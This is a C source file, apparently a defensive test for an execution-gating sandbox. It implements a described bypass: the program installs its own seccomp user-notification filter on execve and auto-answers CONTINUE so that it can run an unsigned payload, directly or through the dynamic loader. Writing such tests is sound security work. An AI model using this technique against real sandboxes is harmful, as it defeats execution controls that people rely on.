/* Bypass class found while building this gate (not one of #9's): a newer
 * SECCOMP_RET_USER_NOTIF filter takes precedence over an older one on the same
 * syscall (linux/seccomp.h, comment above SECCOMP_USER_NOTIF_FLAG_CONTINUE).
 * The sandboxed program installs its own execve notifier and answers CONTINUE.
 * argv[1] = unsigned payload. Tries the payload directly and via the dynamic
 * loader (which Landlock must allow for dynamic ELFs). */
#define _GNU_SOURCE
#include <errno.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <pthread.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <unistd.h>

static int lfd = -1;
static void *responder(void *arg) {
    (void)arg;
    for (;;) {
        struct seccomp_notif n;
        memset(&n, 0, sizeof n);
        if (ioctl(lfd, SECCOMP_IOCTL_NOTIF_RECV, &n) < 0) {
            if (errno == EINTR || errno == ENOENT) continue;
            return NULL;
        }
        struct seccomp_notif_resp r = {.id = n.id, .val = 0, .error = 0, .flags = SECCOMP_USER_NOTIF_FLAG_CONTINUE};
        ioctl(lfd, SECCOMP_IOCTL_NOTIF_SEND, &r);
    }
}

int main(int argc, char **argv) {
    if (argc < 2) return 2;
    struct sock_filter f[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_execve, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_USER_NOTIF),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };
    struct sock_fprog p = {.len = 4, .filter = f};
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    lfd = syscall(SYS_seccomp, SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, &p);
    int e0 = lfd < 0 ? errno : 0;
    if (lfd >= 0) {
        pthread_t t;
        pthread_create(&t, NULL, responder, NULL);
    }
    char *a[] = {argv[1], NULL};
    char *e[] = {NULL};
    execve(argv[1], a, e);
    int e1 = errno;
    char *b[] = {"ld.so", argv[1], NULL};
    execve("/lib64/ld-linux-x86-64.so.2", b, e);
    int e2 = errno;
    printf("BLOCKED:notif_override errnos=%d,%d,%d\n", e0, e1, e2);
    return 0;
}
